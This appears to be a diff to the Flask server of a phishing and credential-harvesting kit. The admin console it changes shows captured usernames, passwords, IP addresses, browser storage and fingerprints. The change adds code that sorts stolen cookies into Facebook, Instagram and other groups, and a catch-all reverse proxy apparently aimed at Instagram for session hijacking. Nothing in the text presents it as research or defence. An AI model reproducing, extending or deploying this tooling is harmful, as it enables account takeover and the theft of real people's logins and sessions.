                FROM captures c WHERE c.id > ? ORDER BY c.id DESC LIMIT 40""",
@@ -1809,13 +2050,22 @@ def admin_capture(cap_id: int):
                 f'<button class="btn" onclick="copy(this)">copy</button></h2>'
                 f"<pre>{escape(content) or '-'}</pre></div>")
 
+    def pairs_block(title: str, pairs: list, cls: str) -> str:
+        if not pairs:
+            return ""
+        text = "\n".join(f"{k} = {v}" for k, v in pairs)
+        return block(f"{title} · {len(pairs)}", text, cls)
+
     fp = json.dumps(json.loads(cap["meta_json"] or "{}"), indent=2, ensure_ascii=False)
     storage = json.loads(cap["storage_json"] or "{}")
     ginfo = json.dumps(json.loads(cap["geo_json"] or "{}"), indent=2, ensure_ascii=False)
 
-    # credentials first, cookies after
+    hf, hi, ho = split_cookie_string(cap["cookie_header"] or "")
+    jf, ji, jo = split_cookie_string(cap["js_cookies"] or "")
+
     creds_html = ""
     for l in logs:
+        lf, li, lo = split_cookie_string(l["js_cookies"] or "")
         creds_html += (
             f'<div class="block cred"><h2>🔑 credentials · {escape(l["source"] or "")} · '
             f'{escape(l["created_at"] or "")} '
@@ -1823,8 +2073,18 @@ def admin_capture(cap_id: int):
             f'<pre><b>username</b> {escape(l["username"] or "")}\n'
             f'<b>password</b> {escape(l["password"] or "")}\n'
             f'<b>ip</b> {escape(l["ip"] or "")}\n'
-            f'<b>ua</b> {escape((l["ua"] or "")[:300])}</pre></div>'
+            f'<b>ua</b> {escape((l["ua"] or "")[:300])}\n'
+            f'<b>cookies</b> fb {len(lf)} · ig {len(li)} · other {len(lo)}</pre></div>'
         )
+
+    cookie_html = (
+        pairs_block("📘 facebook cookies · header", hf, "ck-fb")
+        + pairs_block("📘 facebook cookies · js", jf, "ck-fb")
+        + pairs_block("📸 instagram cookies · header", hi, "ck-ig")
+        + pairs_block("📸 instagram cookies · js", ji, "ck-ig")
+        + pairs_block("🍪 other cookies · header", ho, "ck-other")
+        + pairs_block("🍪 other cookies · js", jo, "ck-other")
+    )
 
     body = (
         f'<a class="btn" href="/admin">← back</a> '
@@ -1838,8 +2098,7 @@ def admin_capture(cap_id: int):
         f'ua        {escape(cap["ua"] or "")}\nreferer   {escape(cap["referer"] or "")}\n'
         f'lang      {escape(cap["accept_lang"] or "")}</pre></div>'
         + creds_html
-        + block("🍪 cookie header (server · meta only)", cap["cookie_header"] or "", "cookie")
-        + block("🍪 document.cookie (js · meta only)", cap["js_cookies"] or "", "cookie")
+        + cookie_html
         + block("localStorage", "\n".join(storage.get("local", [])) or "")
         + block("sessionStorage", "\n".join(storage.get("session", [])) or "")
         + block("fingerprint", fp)
@@ -1915,7 +2174,25 @@ def healthz():
     finally:
         conn.close()
     return jsonify({"ok": True, "captures": caps, "credentials": logs,
-                    "geo": GEO_ENABLED, "admin_locked": bool(ADMIN_TOKEN)})
+                    "geo": GEO_ENABLED, "proxy": PROXY_ON, "admin_locked": bool(ADMIN_TOKEN)})
+
+
+# ---------------- proxy catch-all (must stay last) ----------------
+@app.get("/ig/")
+@app.get("/ig")
+def proxy_root():
+    if not PROXY_ON:
+        abort(404)
+    return proxy_request("")
+
+
+@app.route("/<path:path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
+def proxy_any(path: str):
+    if not PROXY_ON:
+        abort(404)
+    if path.split("/")[0] in ("admin", "collect", "credential", "bookmarklet", "healthz"):
+        abort(404)
+    return proxy_request(path)
 
 
 # ---------------- errors ----------------
@@ -1966,4 +2243,5 @@ init_db()
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", "5000"))
     logger.info("console: http://localhost:%s/admin  (token set: %s)", port, bool(ADMIN_TOKEN))
+    logger.info("proxy: %s (%s)", "on" if PROXY_ON else "off", PROXY_HOST)
     app.run(host="0.0.0.0", port=port, debug=False)
